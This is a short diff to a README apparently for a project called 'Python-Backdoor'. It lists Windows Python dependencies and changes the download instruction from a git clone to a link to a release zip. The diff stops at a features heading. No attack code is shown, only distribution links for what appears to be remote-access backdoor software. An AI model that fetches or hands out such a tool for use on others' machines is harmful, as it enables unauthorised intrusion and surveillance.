@@ -11,8 +11,7 @@ You will needs:
 * [Unoffical Pygame](https://www.lfd.uci.edu/~gohlke/pythonlibs/#pygame)
 * [VideoCapture](https://www.lfd.uci.edu/~gohlke/pythonlibs/#videocapture)
 
-The program can be downloaded via github or git eg.
-`git clone https://github.com/xp4xbox/Python-Backdoor`
+Latest release can be found [here](https://github.com/xp4xbox/Python-Backdoor/blob/master/release/PythonBackdoor.zip?raw=true)
 
 ## Features
 Currently this program has several features such as:
